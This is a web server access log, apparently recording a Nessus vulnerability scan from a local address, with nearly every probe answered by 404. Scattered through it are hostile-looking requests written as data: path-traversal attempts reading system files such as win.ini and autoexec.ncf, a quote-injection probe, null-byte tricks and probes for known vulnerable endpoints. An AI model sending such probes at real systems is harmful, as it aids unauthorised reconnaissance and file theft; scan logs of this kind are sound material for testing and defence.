+INFO:     192.168.31.2:56484 - "GET /portal/pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56496 - "GET /portal/pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56498 - "GET /portal/pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56508 - "GET /portal/pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56524 - "GET /portal/pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56528 - "GET /portal/pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56530 - "GET /portal/pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56546 - "GET /portal/pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56556 - "GET /portal/pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56558 - "GET /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56570 - "GET /pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56576 - "GET /pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56586 - "GET /pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56600 - "GET /pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56604 - "GET /pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56612 - "GET /pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56624 - "GET /pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56638 - "GET /pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56646 - "GET /pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56648 - "GET /pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56662 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56674 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56680 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56690 - "GET /dndirector/dashboard/Show.dn HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56692 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56706 - "GET /dndirector HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56712 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56724 - "GET /btmui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56734 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56744 - "GET /ords/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56760 - "GET /apex/listenerConfigure HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56766 - "GET /apex/f?p=nessuscheck HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56776 - "GET /pls/apex/f?p=nessuscheck HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56788 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56798 - "GET /cgi-bin/luci HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56810 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56822 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56838 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56846 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56856 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56860 - "GET /conductor HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56874 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56888 - "GET /dwr/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56892 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56906 - "GET /cgi-bin/pub/pki?cmd=serverInfo HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56884 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56920 - "GET /login.jsp HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:56930 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56942 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56948 - "GET /cgi-bin/mrlg.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56962 - "GET /lg/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56968 - "GET /mrlg/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56972 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56986 - "GET /NoviSurvey/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56990 - "GET /Login.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56996 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57000 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57002 - "GET /netbasic/websinfo.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57018 - "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/allfield.jse HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57020 - "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/test.jse HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57030 - "GET /perl/samples/lancgi.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57034 - "GET /perl/samples/ndslogin.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57038 - "GET /perl/samples/volscgi.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57044 - "GET /perl/samples/env.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57050 - "GET /nsn/env.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57052 - "GET /nsn/fdir.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57058 - "GET /nsn/..%5Cutil/chkvol.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57064 - "GET /nsn/..%5Cutil/dir.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57074 - "GET /nsn/..%5Cutil/glist.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57080 - "GET /nsn/..%5Cutil/lancard.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57086 - "GET /nsn/..%5Cutil/set.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57100 - "GET /nsn/..%5Cutil/userlist.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57116 - "GET /nsn/..%5Cweb/env.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57118 - "GET /nsn/..%5Cwebdemo/fdir.bas HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57122 - "GET /servlet/ServletManager HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57134 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57150 - "GET /nps/servlet/portal HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57154 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57168 - "GET /gwadmin-console/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57172 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57186 - "GET /IDMProv/jsps/help/Help.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57198 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57206 - "GET /logout HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:57208 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57216 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57220 - "POST /perl/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57222 - "GET /examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57232 - "GET /help/contents.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57246 - "GET /manual/ag/contents.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57254 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57266 - "GET /images HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57270 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57272 - "GET /baselining/version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57284 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57298 - "GET /nps/servlet/portalservice HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57312 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57324 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57330 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57336 - "GET /userSession.do?method=getLanguage HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57340 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57356 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57366 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57382 - "GET /Admin/index.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57392 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57396 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57406 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57414 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57416 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57420 - "GET /qsoap.qap HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57426 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57428 - "GET /login.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57444 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57460 - "GET /nacos/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57470 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57472 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57486 - "GET //Help.action HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57494 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57506 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57522 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57530 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57532 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57548 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57554 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57562 - "GET /mod_gzip_status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57572 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57586 - "GET /esm_login.asp?loginBannerDisplayed=1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57590 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57602 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57606 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57614 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57618 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57622 - "GET /server-manager/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57350 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57352 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57358 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57362 - "GET /uddipublic/default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57364 - "GET /uddi/default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53672 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53686 - "GET /Explorer/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53698 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53712 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53724 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53728 - "GET /sabin/SiteAdmin.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53734 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53750 - "GET /reporter/client.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53762 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53776 - "GET /index.exp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53790 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53798 - "GET /core/orionSplashScreen.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53802 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53812 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53818 - "GET /admin/LocalIndex.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53832 - "GET /scmadmin/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53840 - "GET /scmadmin/LocalIndex.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53844 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53850 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53864 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53874 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53878 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53886 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53894 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53906 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53918 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53920 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45452 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45456 - "GET /mantis/login_page.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45472 - "GET /mantisbt/login_page.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45484 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45490 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45506 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45518 - "GET /PassTrixMain.cc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45526 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45542 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45544 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45554 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45558 - "GET /configurations.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45564 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45570 - "GET /netflow/html/aboutus.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45584 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45596 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45608 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45620 - "GET /LoginPage.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45622 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45638 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45654 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45668 - "GET /login.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45684 - "GET /event/index.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45698 - "GET /help/introduction/release-notes.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45710 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45716 - "GET /NCMContainer.cc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45724 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45732 - "GET /index.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45728 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45746 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45750 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45762 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45778 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45796 - "POST /servlet/GetProductVersion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45786 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45804 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45806 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45810 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45822 - "GET /smconf.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45826 - "GET /smadmr5.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45830 - "GET /smency.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45840 - "GET /smftypes.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45854 - "GET /smsmvlog.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45856 - "GET /smhelp.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45872 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45876 - "GET /smmsg.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45884 - "GET /smtime.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45896 - "GET /stcenter.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45898 - "GET /smquar.nsf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45908 - "GET /Sametime/buildinfo.txt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45912 - "GET /Sametime/domino/html/sametime/buildinfoST75CF1.txt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45916 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45924 - "POST /server/service/smsConfigServiceHttpInvoker HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45932 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45934 - "GET /login/index.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45942 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45952 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45962 - "GET /HNAP1/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45970 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45976 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45980 - "GET /mve/help/en/inventory/am_about.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45982 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45984 - "POST /jsonrpc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45998 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46006 - "GET /mainui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46014 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46016 - "GET /api/v1.0/environment HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46028 - "GET /vsapres/web20/core/login.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46036 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46042 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46058 - "GET /device HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46060 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46070 - "GET /assets/js/conf/global_config.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46074 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46076 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46084 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46092 - "GET /./WEB-INF/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46100 - "GET /invoker/EJBInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46100 - "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46108 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46116 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46132 - "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46138 - "GET /web-console/ServerInfo.jsp%00 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46144 - "GET %25. HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46156 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46172 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46184 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46194 - "GET /NASApp/nessus/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46204 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46196 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46214 - "GET /NASApp/nessus/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46216 - "GET /home.seam HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46220 - "GET /interscan/cgi-bin/FtpSave.dll?I'm%20Here HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46230 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46238 - "NESSUS / HTTP/1.0" 405 Method Not Allowed
+INFO:     192.168.31.2:46248 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46260 - "GET /ipam/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46274 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46276 - "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46282 - "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus' HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46284 - "GET /NULL.ida HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46288 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46300 - "GET / HTTP/1.0" 200 OK
+INFO:     192.168.31.2:46314 - "GET //Xk3uoU4S.asp HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:46324 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46334 - "GET /iisadmpwd/aexp.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46348 - "GET /iisadmpwd/aexp2.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46356 - "GET /iisadmpwd/aexp2b.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46366 - "GET /iisadmpwd/aexp3.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46380 - "GET /iisadmpwd/aexp4.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46382 - "GET /iisadmpwd/aexp4b.htr HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46386 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46392 - "GET /igsponsor HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46408 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46420 - "GET /query.idq?CiTemplate=../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46432 - "GET /query.idq?CiTemplate=../../../../../winnt/win.ini%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46448 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46450 - "GET /mail/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46462 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46468 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46478 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46482 - "GET // HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46484 - "GET /tsp// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46496 - "GET /ap// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46500 - "GET /ssp// HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46510 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46514 - "GET /builtin/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46518 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46530 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46534 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46546 - "GET /niet49996652 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46554 - "GET /niet2055790046. HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46558 - "GET /niet359085451.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46560 - "GET /niet1691381750.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46572 - "GET /niet939182734.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46576 - "GET /niet940667453.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46580 - "GET /niet498663774.shtm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46596 - "GET /niet2094202132.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46604 - "GET /niet1692322328.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46620 - "GET /niet1738421257.jspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46626 - "GET /niet939993568.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46636 - "GET /niet500383570.php3 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46648 - "GET /niet1305503428.php4 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46660 - "GET /niet28400960.php5 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46676 - "GET /niet820339390.php6 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46684 - "GET /niet1778043495.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46708 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46722 - "GET /cgi-bin/com5.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46730 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46736 - "GET /rcladmin/js/art_i18n/nls/art_i18n.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46740 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46748 - "GET /rdweb/login/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46756 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46764 - "GET /ibmmq/console/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46768 - "GET /ibmmq/console/nls/en/strings.json HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46776 - "GET / HTTP/1.1" 200 OK
